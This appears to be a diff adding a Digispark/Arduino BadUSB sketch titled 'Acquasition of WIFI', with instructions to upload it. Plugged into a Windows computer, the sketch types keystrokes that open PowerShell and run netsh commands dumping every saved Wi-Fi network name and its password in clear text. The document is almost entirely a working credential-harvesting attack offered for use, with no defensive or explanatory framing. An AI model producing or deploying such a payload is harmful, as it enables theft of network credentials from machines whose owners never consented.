@@ -1,0 +1,42 @@
+Acquasition of WIFI 
+
+paste the following code on arduino 
+and upload   and follow the output -----------
+
+
+
+#include "DigiKeyboard.h"
+
+void setup() {
+
+  DigiKeyboard.delay(3000);
+
+  // Open Run (Win + R)
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+
+  // Open PowerShell
+  DigiKeyboard.print("powershell");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1500);
+
+  // List WiFi profiles (names only)
+// List WiFi profiles (names only)
+DigiKeyboard.print(
+"netsh wlan show profiles | "
+"Select-String \"All User Profile\" | "
+"ForEach-Object { "
+"$name = ($_ -split \":\")[1].Trim(); "
+"$details = netsh wlan show profile name=\"$name\" key=clear; "
+"$password = ($details | Select-String \"Key Content\"); "
+"[PSCustomObject]@{ "
+"WiFiName = $name; "
+"Password = if ($password) { ($password -split \":\")[1].Trim() } else { \"No password stored\" } "
+"} "
+"}"
+);
+
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+}
+
+void loop() {}
